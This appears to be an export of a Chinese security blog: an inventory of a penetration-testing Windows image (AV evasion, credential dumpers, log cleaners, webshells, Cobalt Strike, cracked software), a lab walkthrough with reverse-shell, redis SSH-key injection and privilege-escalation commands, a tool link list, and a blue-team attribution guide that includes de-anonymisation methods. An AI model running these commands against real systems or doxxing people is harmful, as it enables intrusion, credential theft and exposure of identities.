X情报查询助手:微步社区 YetAnotherDragAndGo:超链接拖拽新窗口打开 ZoomEye Tools 类似的网站 Contextmenumanager:右键菜单管理工具 Dism++:系统调节工具 Everything:搜索工具（已禁用windows自带搜索） Goldwave:音频编辑工具 GoogleEarth:谷歌地球 Honeyview:看图工具 Huorong:杀毒工具（C:\\Penetration 为白名单） ICON:第三方图标包 Internet Download Manager:6.41.6（注册版） IOBit: AdvancedSystemcare:优化清理工具（注册版） DriverBooster:驱动工具（注册版） SmartDefrag:磁盘整理工具（注册版） Uninstaller:卸载工具（注册版） Mactype:字体管理工具（已修改系统默认字体为Mac苹方体） Maye:快捷启动工具 Meitu:美图秀秀 OldNewExplorer:资源管理器调节工具 PCMaster:系统调整工具 已创建右键快捷菜单: 在此处打开Terminal终端 在此处打开KaliLinux终端 在此处打开Notepad 控制面板 计算器 注册表 Potplayer:视频播放工具 Refresh:刷新图标缓存 Snipaste:截图工具 Telegram:电报客户端 UltraISO:iso编辑工具 WPS:WPS（注册版） 渗透测试类（C:\\Penetration）: 常用的python、C#及java类工具均配有start.bat或start.vbs。 注明工具版本及更新时间； 注明依赖环境； 注明主要参数； 注明简要用法（给工具不给用法的都是耍流氓） [+] 安卓工具: AndroidHelper:apk逆向工具 AndroidKiller:apk综合工具 Apkinfo:apk分析工具 Apktool:apk反编译工具 ApkToolbox:apk综合工具 ApkToolPlus:apk反编译分析工具 AppMessenger:apk分析工具 Dex2jar:dex打包工具 Nox:夜神安卓模拟器（安卓9.0） 已安装: Debug Proxy HttpCanary JuiceSSH MT Net Capture NP Packet Capture ProxyDroid Terminal Emulator 开发者助手 Yaazhini:apk漏洞扫描工具 [+] 免杀工具: Aniya AVevasion Bypass-antivirus:免杀教程 Charlotte Cool DarkArmour GLLloader Invoke-Obfuscation Loader Powershell-Obfuscation Sandboxie:沙盒工具 ShellcodeLoader VMProtect:加壳工具 VProtect:加壳工具 ZheTian:遮天shellcode加载工具 [+] 连接工具: Anydesk Filezilla Finalshell MobaXterm Putty Teamviewer WinSCP Xmanager [+] 破解工具: AccessCrack:access密码破解工具 Advanced Archive Password Recovery:压缩包密码破解工具 Advanced Office Password Recovery:office密码破解工具 Advanced PDF Password Recovery:pdf密码破解工具 DecryptPassword 文件夹下集成下列密码破解工具: finalshell-decoder finalshellPasswordDecoder firefox_decrypt FireFox-Thief hack-browser-data-windows how-does-navicat-encrypt-password how-does-SecureCRT-encrypt-password how-does-Xmanager-encrypt-password Safe360Browsergetpass SharpDecryptPwd teamviewer-dumper vcenterExsi_PwdDecrypt winscppasswd Hydra:口令爆破工具 MD5Crack:md5碰撞工具 SNETCracker:超级弱口令破解工具 WebshellCrack:一句话密码破解工具 K8_FuckOneShell K8_OneShellCrack T00ls综合一句话爆破工具 [+] 数据工具: AnotherRedisDesktopManager:redis管理工具 DatabaseBrowser:mdb &amp; xls数据库查看工具 DatabaseUtilizationTools:数据库利用工具 HeidiSQL:数据库连接管理工具 Microsoft SQL Server:2019专业版 username:sa password:sqladmin Microsoft SQL Server Management:mssql连接工具 Navicat:数据库连接管理工具 Neo4j:neo4j数据库管理工具 OracleShell:oracle利用工具 RedisDesktopManager:redis管理工具 SharpSqlTools:mssql数据库利用工具 Sqlite:sqlite数据库管理工具 Sqlknife:mssql数据库利用工具 Sqlmap:注入工具 SQLTools:mssql利用工具 Sylas:mssql &amp; orcle &amp; postgresql数据库利用工具 ToadOracle:oracle数据库管理工具 [+] 夺旗工具（CTF）: ASCII BehinderDecode BerylEnigma Binwalk BlindWatermark CaptfEncoder Converter CRCCalculator CTFEditor CTFTools CTFcrack CyberChef DesTool F5Steganography FindFlag Foremost GifTools GNUplot JPHS MossTool LSBSteganography MP3Steno NamoGif Animator Outguess PcapTool PixRecovery PNGCalculator PNGCheck PNGDebugger QRResearch QRCode Regular RSATool RSA_N SM4 Steganography Stegdetect Steghide Stegsolve Taowa Tool Tweak PNG Volatility Volatility Workbench wbStego WinHex Xiaokui ZZYQR ctf 密码学知识点总结 ctf 逆向知识点总结 ctf 隐写术知识点总结 [+] 字典工具: DictMaker:字典生成工具 PwdBUD 黑刀字典生成工具 火花字典生成工具 木头字典生成工具 品轩字典生成工具 易优字典生成工具 fuzzDicts pentestdicts [+] 磁盘工具: Diskgenius:注册版（可恢复硬盘数据） SSDfresh:ssd优化工具 [+] 编辑工具: 010Editor:十六进制编辑工具（注册版） BeyondCompare:文件对比工具 eSearch:截屏、录屏、OCR、搜索、翻译、贴图、以图搜图（已集成离线OCR库） FFRename:菲菲更名宝贝（专业版） FindStr:文本检索工具 FireKylin:系统痕迹采集 Fortify:代码审计工具22.1.0（已集成rules）（注册版） JavaDecompiler:java查看编辑工具 Jsonview:json查看编辑工具 LogParse:windows日志分析工具 LogParseLizard:windows日志分析工具（图形化） myBase:个人数据库编辑工具（注册版） Notepad++:编辑工具 PSTConverter:pst邮件转换工具 Seay:php代码审计工具 SeayDzend:php zend解密工具 SharpSword:csharp版本word查看工具 Sublime:编辑工具（注册版） Typora:MarkDown编辑工具（注册版） VSCode:VisualCode编辑工具 WindowsLogsAnalysis:windows日志分析工具（图形化） XMind:思维导图工具 YoudaoDict:有道词典（注册版）（已集成离线翻译库） [+] 漏洞工具: AlibabaNacos Apache Cacti Cas Chrome Citrix CMSHunter Confluence D-Link Database mongo mssql mysql redis Elasticsearch F5-BIG-IP FastAdmin Fastjson FCKEditor FusionAuth Gitlab Harbor HTTPBasic HTTPFileServer IIS ILO4 Intellian-Aptus-Web Jboss Jellyfin Jenkins Jira JumpServer Kibana Liferay Linux CVE-2015-1328 CVE-2019-14287 CVE-2021-22555 CVE-2021-3156 CVE-2021-33909 CVE-2021-3493 CVE-2021-4034 CVE-2022-0847-1 CVE-2022-0847-2 CVE-2022-23222 … Mail coremail exchange zimbra MetaCRM ModSecurity Nexus Node.js OA seeyon tongda weaver Office Open-AudIT Others PHP-FPM PHP phpMyadmin PHPStudy Rconfig SaltStack Sangfor SAP Shiro ShowDoc Solarwinds Spring Struts2 Sunlogin TeamViewer Tomcat Tools AliyunAKTools:阿里云利用工具 AptTools:综合漏洞利用工具 CF:云环境利用框架 CodeTest:综合漏洞利用工具 docs-0sec:零组文档库 docs-base:漏洞文档库 Fuxploider:漏洞扫描工具 Gr33k:综合漏洞利用工具 HVVExploitApply:寻云安全团队1.5 综合漏洞利用工具（未取得授权，特此删除） LiqunKit:综合漏洞利用工具 MYExploit:综合漏洞利用工具 NSudoLG:windows提权工具 Nuclei:内网扫描工具 OATools:OA漏洞利用工具 POCbomber:综合漏洞利用工具 poc2jar:综合漏洞利用工具 Ruoyi-All:综合漏洞利用工具 Shenji:综合漏洞利用工具 SuperXray:综合漏洞利用工具 Vulmap:综合漏洞利用工具 WinExpSuggester-NG:windows提权工具 WinExpSuggester:windows提权工具 Xray:漏洞扫描工具 Ysoserial TPLink VMware Weblogic Webmin Windows CVE-2003-0352 CVE-2005-1983 CVE-2006-3439 CVE-2008-1084 … CVE-2021-42287 CVE-2022-21907 CVE-2022-26923 … MS03-026 MS05-039 MS06-040 … MS17-017 XenMobile XStream XXL-job Ysuserial Zoho Zyxel 漏洞库综合了下列项目: CMSHunter expHub Middleware-Vulnerability-Detection System-Vulnerability Vulnerability 更多漏洞exp见 C:\\Penetration\\ExpolitTools（漏洞exp较多，请善用everything搜索） [+] 内网工具: 3Gstudent:三好学生powershell &amp; python脚本 ABPTTS:内网穿透工具 AddUser:添加用户工具 ADExplore:ldap工具 ADinfo:内网信息搜集工具 Aoratos:软件运行痕迹清理工具 BloodHound:域渗透分析工具 BloudyAD:域渗透利用工具 BruteLogon:windows口令爆破工具 ClearLogs:windows日志清除工具 CrackMapExec:内网综合利用工具 DefeatDefender:关闭defender工具 DomainTools:域渗透综合利用工具 DomainInfoFind:获取域内机器的桌面文件 EarthWorm:内网穿透工具 Frp:内网穿透工具 FScan:内网扫描工具 GetWinInfo:windows信息搜集工具 Gorailgun:内网渗透综合利用工具 password:三个空格 GoToHTTP:远控工具 Hoaxshell:远控工具 impacket:内网协议工具 iox:流量代理工具 Ladon:内网扫描工具（小密圈9.3版本） LCX:端口转发工具 LdapAdmin:ldap工具 LDAPDomainDump:ldap工具 Mimikatz:密码抓取工具 文件夹下集成下列密码抓取工具 gosecretsdump hklm kekeo lazagne mimipenguin ntdsdumpex procdump pwdump quarkspwdump Mip22:网页钓鱼工具 Moonwalk:linux取证工具 Nacs:内网扫描工具 NC:监听工具 Neo-reGeorg:regeorg重构版 NetSpy:内网网段探测工具 NPS:内网代理工具 OpenRDP:开启远程桌面工具 OpenSSH:ssh工具 Pack:打包工具 7z（单文件版） PE:WeiPE镜像 PEASS-ng:linux取证工具 PowerProxy:powershell代理工具 PowershDLL:powershell工具 PS2EXE:powershell转exe工具 PSTools:微软psexec工具 PyStinger:流量代理工具 ReverseShell:反弹shell工具 revsh:内网穿透工具 Scan4all:内网扫描工具 ScheduleRunner:计划任务利用工具 SharpTools: CatchBrowser:浏览器密码抓取工具 SharpAdiDnsDump:域dns枚举工具 SharpDecryptPwd:浏览器密码解密工具 SharpEventLog:日志分析工具 SharpHound:域渗透分析工具 SharpListRDPConnections:rdp连接记录枚举工具 SharpNetCheck:出网探测工具 SharpRDPLog:rdp连接记录枚举工具 SharpStrike:cobaltstrike工具 SharpWxDump:微信解密工具 StopDefender:关闭defender工具 Stowaway:内网穿透工具 SweetBabyScan:内网扫描工具 Traitor:linux提权工具 WCE:windows凭证编辑工具 Wget:下载工具 wmiHacker:wmi渗透工具 更多内网工具见 C:\\Penetration\\IntranetTools [+] 办公工具: Adobe Acrobat DC 2022:PDF编辑工具 Office:Word + Excel + Powerpoint + Access + Onenote + Outlook WPS:Word + Excel + Powerpoint + PDF [+] 编程工具: GCC Golang Java: jre1.8.0:已配置环境变量，系统默认调用java8 jre15.0.2:绿色版，如有特殊软件需要java15环境运行可直接调用/bin/java.exe即可 Nodejs Python: python2:python2命令启动（python2 test.py） python3:python3命令启动（python3 test.py） 已集成本镜像所有python3工具的pip依赖库（如有遗漏未安装的库请自行安装） 使用pip命令调用python3 pip VisualStudio 2022:社区版 [+] 逆向工具: bat2exe:bat转exe工具 DetectItEasy:查壳工具 dnSpy:.Net逆向工具 exeScope:exe编辑工具 GreenHelper:exe绿化工具 HashMaker:hash工具 IDAPro:吾爱破解版 ILSpy:.Net逆向工具 jadx:java反编译工具 OllyDebug:exe调试工具 peidTool:查壳工具 SignTool:签名伪造工具 upxShell:upx加壳工具 vbs2exe:vbs转exe工具 x64dbg:exe调试工具 [+] 扫描工具: Acunetix:15.1.221109177（注册版） username:admin@awvs.com password:Admin@awvs.com AppScan:10.0.7（注册版） Goby:2.0.5红队专版（含1288 poc） Nessus:10.3.1（注册版） username:admin password:password Nmap:端口扫描工具 RouterScan:C段扫描工具 ScanBox AVScan 杀毒软件检测工具: CheckAV（自己写的辣鸡代码，如有需要可以随便使用） LeakScan 敏感文件扫描工具: dirMap dirSearch PackerFuzzer ScanTools Yujian GitHack 7KB WebPath Brute 7KB Ucenter Sniper 7KB WordPress Sniper … SubDomain 子域名探测工具: FofaView:fofa查询工具 InfoSearchAll Layer:子域名挖掘机 OneforAll Securitytrails:Securitytrails官方api脚本 SnowShadow Sublist3r Subfinder ThunderSearch WebBatchRequest WebFinder … 更多扫描工具见 C:\\Penetration\\ScanTools\\ScanBox [+] 权限工具: Antsword:蚁剑（已集成插件） Behinder:冰蝎（shell密码统一为rebeyond） behinder 3.0 beta11 behinder 4.0.6 Cobaltstrike:Dog 4.4 汉化版 使用CSAgent汉化 vps启动teamserver:sudo ./teamserver your_ip your_password random.profile 集成插件（C:\\Penetration\\ShellTools\\CobaltStrike\\Scripts） adcollection bypassav erebus eval eventlogmaster ladon mikasa taowu ByPassBehinder:jsp免杀工具 Godzilla:哥斯拉 Hema:河马webshell查杀工具 Kali:WSL Kali Linux 2022.3 用户: username:kali password:kali username:root password:root 修改软件源为阿里云 完整安装Kali Linux所有软件包 Skyscorpion:天蝎 Shell:免杀一句话木马（密码统一为cmd） Webshell:webshell收集项目 WebshellBypassedHuman:webshell免杀 WebshellGenerate:webshell生成工具 [+] 流量工具: BlueTeamTools:流量解密工具 BurpSuite:2022.1.1 汉化插件 集成插件: VulnersScanner ChangeU ChunkedCodingConverter DomainHunter FakeIP Hackbar Sqlmap4burp TurboIntruder Fiddler:流量抓包工具（汉化版） ftpServers:ftp开启工具 HackFirefox:firefox 49.0 集成插件版 ipChanger:ip代理工具 LiqunShield:webshell流量分析工具 NetSetMan:网络参数设置工具 OpenVPN:vpn工具 phpStudy:8.1集成环境 Proxifier:流量代理工具（汉化版） ShadowSocks:科学上网工具 TorBowser:洋葱浏览器 v2ray:科学上网工具 WireShark:流量抓包分析工具 Yakit 全套虚拟机镜像： Windows 7 x64 Windows 8 x64 Windows 10 x64 Windows Server 2008 x64 Windows Server 2012 x64 Windows Server 2016 x64 Windows Server 2019 x64 Ubuntu 20 x64 所有虚拟机镜像均安装： VMTools 7z Microsoft Visual C++ 2008-2022 运行库 密钥或激活工具激活 可供测试软件，环境搭建等用途。 虚拟机账号密码已备注在VMware描述栏处，请注意查看。 下载链接：  "},{"title":"渗透学习靶机打靶思路与方法","date":"2022-11-30T10:15:09.000Z","url":"/2022/11/30/%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0%E9%9D%B6%E6%9C%BA%E6%89%93%E9%9D%B6%E6%80%9D%E8%B7%AF%E4%B8%8E%E6%96%B9%E6%B3%95/","categories":[["渗透","/categories/%E6%B8%97%E9%80%8F/"]],"content":"一．对靶机进行信息收集1.首先对目标存活靶机发起嗅探： ①sudo arp-scan -l 针对网卡发起扫描存活主机 ②arping扫描：for i in (seq 1 254);do arping −c 2 10.0.2.i; done ③netdiscover：sudo netdiscover -r 10.0.2.0/16 ④nmap主机发现：nmap -sn 10.0.2.4/24 ⑤fping侦探：fping -gaq 10.0.2.0/24 2.对目标主机开放端口及服务发起探测 ①masscan快速扫描 ②nmap进行扫描 (1)nmap -p- ip (2)nmap -p22,80,.. -A ip (3)当目标主机开启防火墙时：nmap –script=firewalk –traceroute ip 详细绕过文章参考：  3.对非web端口的服务发起迅速的嗅探，尝试使用nday进行攻击 ①kali自带的exploitdb ②msf进行攻击嗅探 ③可以使用搜索引擎尝试搜索最新还未收录的day ④对如mysql及ssh端口开放的服务可以使用hydra进行密码的爆破 4.开始进行web端口外部打点尝试 首先对目标端口开放的功能点发起测试， 如登录框，弱密码，xss，爆破，sql注入等，尝试能否直接拿到shell， 如果首界面得不到有效信息，开始进行路径爆破，对路径爆破得到的路径进行详细的侦测，流程及思路与测试主页面一致， 将大量收集得到的信息进行整合记录，查看每一个收集得到的路径的页面源代码 如果发现有子域名未绑定，搜集得到的子域名进行绑定，再次对子域名发起攻击，包括中间件及应用，通过searchsploit搜索可以利用的版本漏洞尝试进行突破，这是外部打点最为重要的一步。 ①使用feroxbuster进行路径发现：feroxbuster –url  ②使用gobuster进行路径发现： 使用gobuster进行更加针对性的扫描： 使用gobuster进行子域名的爆破： ③构建自己的参数字典进行参数爆破：123abc’”(&lt;,;/% ④使用fuff进行双参数爆破： -w val.txt:VAL -u  0 -fs 是为了过滤掉无效的内容 使用fuff进行模糊参数爆破： ⑤使用dirsearch进行路径爆破： ⑥利用cewl生成特定的字典 ⑦利用dirb来进行路径爆破 使用dirb进备份文件检查 dirb  .bak,back 二．一些靶机打点的工具和知识：1.当目标靶机nc中不存在-e参数时两种串联攻击方法： 2.cyberchef平台上可以进行多种多样的加密与解密 3.node.js下的express-fileupload模块存在参数污染远程命令代码执行漏洞 exp： 4.node是一个类似于java的运行环境， 利用node反弹shell，sudo node -e ‘child_process.spawn(“/bin/bash”,{stdio:[0,1,2]})’ 5.bash指令受限为非交互式的shell时的详细操作（只适用于bshell）： ctrl+z 将获得的shell进程隐藏 stty raw -echo stty echo 取消不显设置 rstty时一个用来改变并打印终端行设置的常用命令。 fg 将后台的命令调到前台来 发现仍然无法正常执行，原因是因为kali 上面用的是zshell不是bshell，但是目标靶机上用的是bshell chsh -s /bin/bash 将kali上的zshell改为bshell ctrl+r 重启kali echo $SHELL 得到bshell 重启后:stty raw -echo 这个地方如果出现执行后无法执行命令，输入python3 -c ‘import pty;pty.spawn(“/bin/bash”)’ 就可以得到www-data@wp:/var/www/html/wordpress$ export SHELL=/bin/bash export TREM=screen stty rows 38 columns 116 reset 发现已经实现了所有的功能包括补齐等等 6.不管是打靶还是在真实的渗透测试中，都需要尽可能的多获得shell，以确保自己有足够的的shell 7.xmlrpc可以远程执行命令： 8.文件包含下的重点伪协议读取 （1）php：php://filter/convert.base64-encode/resource=evil.php （2）gophor协议下的ssrf工具 git clone  9.当可以任意读取目标靶机文件时，利用访问公私钥免于账号密码登录 默认存放位置:公钥 /home/kali/.ssh/authorized_keys 私钥 /home/kali/id_rsa 将拷贝下来的私钥赋予600权限 chmod 600 id_rsa 如果私钥也被加密： 10.有时候如果没有tcp传输的端口，可以怀疑udp53端口作为同一个域之间传输数据的方式，扫描udp53端口 sudo nmap -p53 -sU 10.0.2.15 11.在hosts更改绑定后发现主机记录没有改变时，可以使用dns区域访问，axfr区域传输后会返回域名下的所有记录，dig axfr @10.0.2.28 blackhat.local发现存在axfr漏洞，发现存在新域名,均绑定到hosts里面 12.模板注入通杀代码： 利用模板注入漏洞进行反弹 如果被过滤掉可以对编码进行混淆绕过 13.对网站指纹进行探测：whatweb 14.对页面403做403页面绕过 ①旁站绕过403：将主机名进行替换 ②覆盖URL进行绕过： GET / HTTP/1.1 X-Original-URL: /auth/login 或者X-Rewrite-URL X-Oringinating-IP:127.0.0.1 X-Forwarded-For:127.0.0.1 X-Remote-IP:127.0.0.1 ③通过referer头部修改 ReFerer: 15.john进行密码爆破 首先将文件保存成hash值zip2john a.zip &gt;hash 将wordlists里的Rockyou字典解压保存到桌面 john hash –wordlists=rockyou.txt得到密码ragnarok123 16.使用steghide工具进行探测隐写数，steghide info king 使用binwalk进行二进制的分析，binwalk -B king 17.rpyc远程管理进行提权 添加sudo权限的exp 18.利用破壳漏洞进行打点 （1）查看所有的后缀名为cgi，sh的文件，使用破壳漏洞尝试控制系统 发现带有这些后缀名的文件返回状态码500 （2）使用nmap进行破壳漏洞进行扫描 发现均存在破壳漏洞 （3）使用curl工具进行参数的注入 本机开启侦听端口，发现连接成功突破外部拿下shell 19.StegSeek高效的密码爆破工具 再加上-xf参数得到文件fil 20.当存在火狐存储的账号密码时，可以使用firefox_decrypt-master工具进行破解得到账号密码 21.fernet，是一种python下的加密算法,解密代码如下： 22.WebDAV服务漏洞利用工具DAVTest: davtest -url  yamdoot:Swarg 上传反弹shell的php文件 /usr/share/webshells/php/php-reverse-shell.php davtest -url  yamdoot:Swarg -uploadfile php-reverse-shell.php -uploadloc rev.php 23.wkhtmltppdf组件，可以将html代码转换成pdf，该组件下存在exp可以远程执行文件，在原来xss的地方尝试读取文件 24.enum4linux是Kali Linux自带的一款信息收集工具。它可以收集Windows系统的大量信息，如用户名列表、主机列表、共享列表、密码策略信息、工作组和成员信息、主机信息、打印机信息等等。该工具主要是针对Windows NT/2000/XP/2003，但在Windows 7/10系统，部分功能受限 25.rbash绕过： 26.针对139及445端口的smb服务发起攻击，使用smbclient工具 三．进行linux下的提权1.首先使用 uname -a lsb_release -a对目标靶机进行版本机内核信息收集，使用exploitdb内的内核版本漏洞尝试能否直接提权 两个需要特别注意的内核漏洞： （1）脏牛内核漏洞： 漏洞范围：linux kernel 4.8.3, 4.7.9, 4.4.2&gt;Linux内核 &gt;= 2.6.22 （2）CVE-2021-3493： 影响版本Ubuntu 20.10 Ubuntu 20.04 LTS Ubuntu 18.04 LTS Ubuntu 16.04 LTS Ubuntu 14.04 ESM 还可以使用linux-exploit-suggester进行自动化枚举内核的提权漏洞 2.查找suid权限的文件，尝试进行权限继承或者通过该文件的内容发起进一步探索 权限继承 例：一个名为update_cloudav的文件 权限为rwsr 即存在suid权限 权限继承 3.进行sudo权限检查 sudo -l 尝试利用sudo权限获得root权限例 当awk存在root权限时，使用命令进行提权 4.su提权：需要多注意自己得到过的有效密码信息，尝试看能不能直接提权 5.mysql数据库提权： （1）输入! bash !可以直接执行系统命令，！是system函数的简写，跳出mysql直接得到root权限（ （2）udf提权： find / -iname”mysqludf” -type f 2&gt;/dev/null linux 的so等于windos的dll 都属于动态链接的文件 show variable like ‘%plugins%’ 将该文件传到目标靶机上去，查看mysql的插件，得到存放插件的路径为/usr/lib/mysql/plugin/ 将so文件写入到插件里面，再创建可以执行命令的函数 查看目录里面发现执行成功，开始写入反弹shell的内容 6.检查/etc/passwd是否具有可写权限，可以尝试将账号密码直接写入得到root权限，openssl passwd -1 -1指的是一种加密算法，将加密后的密码写入passw中的root账号 7.利用capabilities进行提权：例： capabilities是一个权限管理功能，设置权限赋予 setcap cap_net_raw,cap_net_admin=eip /usr/bin/dumpcap 首先进行查询指令 /sbin/getcap getcap -r / 2&gt;/dev/null 发现一个python2.7的程序拥有capabilities权限 ps -U root 查看所有以root账号运行的进程 或者 ps -aef | grep root 下载利用权限利用的python进程注入脚本wget python2.7 inject.py 862 默认侦听端口为5600 8.检测系统内账号目录或者敏感目录下有没有定时任务，可以使用pspy工具监视操作系统进程的创建活动，查看是否有定时任务执行或者可以定时执行带root权限的脚本，尝试将反弹语句写入到脚本中 9.利用linux自带的命令进行漏洞提权 详细查询网站：  Sudo提权漏洞CVE-2021-3156 Sudo 1.8.2-31p2，Sudo 1.9.0-5p1 影响的Linux版本：Ubuntu 20.04.1 (Focal Fossa) - sudo 1.8.31, libc-2.31 Debian 10.0 10.利用motd（message of the day）进行提权,motd是一个访问运行脚本的目录，尝试对找到的进程进行注入echo ‘root:123’ | chpasswd 11.利用redis进行提权： cd .ssh .ssh$ nc -nvlp 4444 &gt; authorized_keys ssh-keygen -t rsa cd .ssh nc 10.1.8.138 4444&lt; id_rsa.pub -w 1 ssh登录账号成功 redis-cli -a 密码登录成功 /.ssh$ (echo -e “\\n\\n”; cat authorized_keys;echo -e “\\n\\n”) &gt; pub.txt cat pub.txt | redis-cli -a 密码 -x set ssh_key 再次登录 config set dir /root/.ssh config set dbfilename “authorized_keys” Save 12.读取root账号的公私钥进行提权： 去读取root账号的公私钥 13.rpyc远程管理进行提权 添加sudo权限的exp 四．总结在打靶过程中一定需要注意信息收集的仔细，细节之处有时就包括有没有ls -la查看到某个隐藏的文件，或者路径爆破是不是少了某个关键的路径 建议使用高质量的字典来进行扫描，要善于使用nday进行打点，突破边界之后的提权也需要仔细的信息收集 查看一些敏感的账号目录与命令操作历史，不能放过每一个细节 原文地址： 声明：⽂中所涉及的技术、思路和⼯具仅供以安全为⽬的的学习交流使⽤，任何⼈不得将其⽤于⾮法⽤途以及盈利等⽬的，否则后果⾃⾏承担。****所有渗透都需获取授权！"},{"title":"脚本小子天堂","date":"2022-11-02T03:01:54.000Z","url":"/2022/11/02/%E8%84%9A%E6%9C%AC%E5%B0%8F%E5%AD%90%E5%A4%A9%E5%A0%82/","categories":[["工具","/categories/%E5%B7%A5%E5%85%B7/"]],"content":"脚本小子天堂~0x00 信息收集移动端信息收集AppInfoScanner  目录扫描dirsearch 目录扫描工具  feroxbuster 目录扫描工具  指纹识别ObserverWard 指纹识别工具  ObserverWard 指纹识别工具  EHole（棱洞）3.0 指纹探测工具  OneForAll 子域收集工具  端口扫描Naabu 端口扫描  接口探测URLFinder  敏感文件.git文件泄露  trufflehog敏感信息检测  ihoneyBakFileScan 备份文件泄露扫描  CDN绕过cloudflare绕过查找ip  子域名Payer轻量级快速探测子域名  ksubdomain子域名爆破  subDomainsBrute子域名爆破  空间测绘fofa_viewer fofa图形化查询  0x01 web集成化工具AsamF 资产收集工具  MYExploit 综合利用工具  railgun 渗透集成化工具  ARL 资产侦察灯塔  GOBY网络安全测试工具  YAKIT 网络安全单兵工具  shuize（水泽） 信息收集  0x02 web漏洞利用Webshell管理  aliyun-accesskey-Tools  漏洞扫描Komo信息收集与漏洞利用  afrog快速打点漏洞扫描  AutoPWN-Suite漏洞扫描器  scan4all漏洞扫描  POC-bomber 漏洞扫描器  EasyPen 综合利用工具  Exphub 漏洞利用脚本  nuclei 漏洞扫描器  一款功能强大的安全评估工具Xray  afrog 是一款性能卓越、快速稳定、PoC 可定制化的漏洞扫描工具  是一款 web 漏洞扫描和验证工具vulmap  xss漏洞dalfox xss漏洞扫描器  中间件漏洞利用JNDI-Inject-Exploit注入  jndi_tool注入工具  JNDIExploit注入工具  Spring系列漏洞利用工具  SpringBootExploit  Springboot漏洞全家桶  shiro反序列化漏洞综合利用,包含（回显执行命令/注入内存马）修复原版中NoCC的问题  shiro反序列化漏洞综合利用,包含（回显执行命令/注入内存马）  Cloud-Bucket-Leak-Detection-Tools 云储存利用工具  Log4j2Scan  ShiroExploit  ShiroAttack2  thinkphp_gui_tools  Fastjson-Patrol  cms漏洞泛微oa综合利用脚本  蓝凌OA漏洞利用工具/前台无条件RCE/文件写入  致远OA综合利用工具  致远OA综合利用工具GUI-V1.0  通达OA综合利用工具  0x03 内网信息收集mscan域内网扫描  ALLiN 扫描工具  SharpHostInfo 内网主机探测  内网扫描fscan  0x04 内网漏洞利用钓鱼框架Goblin 钓鱼演练工具  C2框架manjusakaC2框架  c2流量前置  AtlasC2 C2框架Atlas  Malleable C2 Profiles  提权工具PEASS-ng 提权套装  Traitor 提权工具  内网穿透Stowaway 内网穿透  Dog Tunnel(狗洞)端口映射工具  frp 端口映射工具  iox 端口转发多层内网  0x05 云渗透CF 云环境利用框架  0x06 每日文章收集 0x07 在线api调试 0x08 在线木马分析 0x09 在线工具大全 0x10 DNSlog  0x11 匿名上传、下载     0x12 在线游戏机 0X13 SQL沙箱MySQL    Oracle   SQL Server   "},{"title":"HW蓝队溯源流程详细整理分享","date":"2022-09-29T05:24:10.000Z","url":"/2022/09/29/HW%E8%93%9D%E9%98%9F%E6%BA%AF%E6%BA%90%E6%B5%81%E7%A8%8B%E8%AF%A6%E7%BB%86%E6%95%B4%E7%90%86%E5%88%86%E4%BA%AB/","tags":[["溯源","/tags/%E6%BA%AF%E6%BA%90/"]],"categories":[["蓝队","/categories/%E8%93%9D%E9%98%9F/"]],"content":"背景：授权授权攻防演练过程中，攻击者千方百计使用各种方法渗透目标。一般情况下攻击链包括：侦察、武器化、交付、利用、安装、命令和控制、窃取目标数据。在溯源中，安全人员对攻击者某个阶段的攻击特点进行分析，再结合已掌握的威胁情报数据将攻击特点和数据聚类，能够有效掌握攻击者的攻击手法和 IP 、域名资产等。 目标：掌握攻击者的攻击手法（例如：特定木马、武器投递方法）；掌握攻击者的 IP域名资产（例如：木马 C2、木马存放站点、资产特点）；掌握攻击者的虚拟身份、身份；掌握攻击者武器的检测或发现方法，将捕获的数据形成新的线索。 方法论：针对交付、利用、安装、命令和控制四个阶段捕获到的数据做深度分析，聚类提取数据特点形成规则。将规则应用于一些安全设备产出高可信度的告警用于防御，或者结合情报数据（如样本信息、域名信息、IP 信息等），将深度溯源的情报（如身份信息、攻击队伍等）产出。 1. 攻击链部分可溯源的关键点： 2. 攻击链利用阶段可溯源的方法及利用点： 攻击回溯的关键点主要分为两类: 攻击分类：根据攻击者的漏洞利用数据包特点（如：字符串格式、特殊字符串）。攻击者信息：攻击者使用其公司（个人）特有的漏洞利用工具时，可能会在请求包中存在公司（个人）信息。 3. 钓鱼邮件可溯源方法及关键点： 发件 IP、发件账号、邮件内容（格式特点等）可用于将攻击者投递的邮件分类； 发件账号中可能存在个人信息，如：“账号@qq.com”、“昵称@gmail.com” 等此类字符串，检索该字符串可用于挖掘身份信息； 邮件内容大致可分以下三类： 投递物（后门木马、其他攻击组件） 钓鱼网站，包含域名、IP 等信息 其他，需要研究邮件中的字符串，邮件可能存在攻击者的其他账号（在真实场景中出现过）发件 IP、发件服务器，属攻击者资产。 4. 后门木马可溯源方法及关键点： 代码逻辑，由于人的惰性，红队开发者可能会复用以前的一些代码。如代码特点比较明显，可用于分类和拓线。 字符串特点，用于将红队投递的样本分类和拓线更多的样本，将检索到的样本再进行分析，分析历史样本（如测试阶段的样本）看是否会暴露出更多信息。 元数据（投递的诱饵不同，得到的元数据不同。诱饵类型包括：LNK、EXE、DOCX等）。 EXE 文件：存在 PDB 信息，部分开发人员将项目存放在桌面，这会导致编译信息带入开发人员的终端名称（极大可能为个人昵称）。 LNK 文件：由于 LNK 文件在新建的时候会带入计算机名称，这可以用于样本的拓线和分类，极少情况下可找到个人昵称。 DOCX 文件：可能存在“最后编辑者名称”。 回连 C2，属攻击者资产。 5. 攻击者资产维度可溯源方法及关键点: 域名自身特点，如：昵称字符串 搭建网站（通过图中四种方法探测资产的现有数据和历史数据） 网站可能存在红队的其他攻击组件 网站存在个人昵称、简介等 网站备案信息 Whois 信息，可能包含：注册者邮箱、电话号码等 IP 信息需要考虑如下两点： 是否定位到某个安全公司的地理位置 是否标记为某个安全公司的网关 6.命令和控制阶段可产生的数据 用于防御，将掌握的流量规则部署在安全设备中积累数据，掌握更多的木马、资产，支撑上述中的各种溯源方法 7.身份信息溯源方向： 虚拟身份 攻击者资产暴露的信息，如：Whois 信息、个人网站简介、GitHub 个人简介 样本暴露的信息，如：PDB 信息、个人昵称、存放特马的 Github 账号 蜜罐捕获，如：百度 ID、新浪 ID 等 利用密码找回功能，如：阿里云IP找回、腾讯密码找回、邮箱密码找回 身份 社交平台（如百度贴吧、QQ 空间、新浪微博等）暴露真实姓名、手机号码 支付宝转账功能，搜索邮箱、手机号 已知的线索（邮箱、QQ、昵称等）在招聘网站搜索 利用搜索引擎，如：手机号和真实姓名存放一起的 XXX 学校表格 公司信息 IP资产定位、域名 Whois 信息 特有漏洞利用工具暴露的信息，如：User Agent、Cookie、Payload 